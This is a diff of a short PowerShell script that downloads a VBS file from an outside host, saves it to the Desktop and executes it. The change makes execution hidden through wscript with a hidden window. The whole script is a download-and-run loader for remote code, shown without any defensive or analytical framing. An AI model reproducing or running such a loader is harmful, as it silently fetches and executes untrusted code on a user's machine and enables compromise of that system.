@@ -1,7 +1,5 @@
 $vbsUrl = "https://spizza.cc/brainrot.vbs"
-$vbsContent = (Invoke-WebRequest -Uri $vbsUrl -UseBasicParsing).Content
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $vbsFile = "$desktopPath\script.vbs"
-$vbsContent | Out-File $vbsFile -Encoding UTF8
-Start-Process "cscript.exe" -ArgumentList "//NoLogo", $vbsFile -Wait
-Remove-Item $vbsFile -Force
+Invoke-WebRequest -Uri $vbsUrl -UseBasicParsing -OutFile $vbsFile
+Start-Process "wscript.exe" -ArgumentList """$vbsFile""" -WindowStyle Hidden -Wait
